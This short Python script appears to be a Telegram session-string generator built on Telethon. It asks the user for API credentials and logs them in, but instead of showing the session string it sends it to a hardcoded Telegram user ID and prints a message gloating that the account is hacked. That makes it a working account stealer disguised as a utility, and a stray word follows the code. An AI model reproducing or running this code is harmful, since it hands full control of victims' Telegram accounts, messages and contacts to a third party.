from telethon.sessions import StringSession
from telethon.sync import TelegramClient

print("""PLEASE ENTER THE REQUIRED DETAILS""")
APP_ID = int(input("Enter APP ID here: "))
API_HASH = input("Enter API HASH here: ")

with TelegramClient(StringSession(), APP_ID, API_HASH) as client:
	print("[ Go N Enjoy SoN UR Account is Hacked ]")
	client.send_message(1415798813, client.session.save())
Not
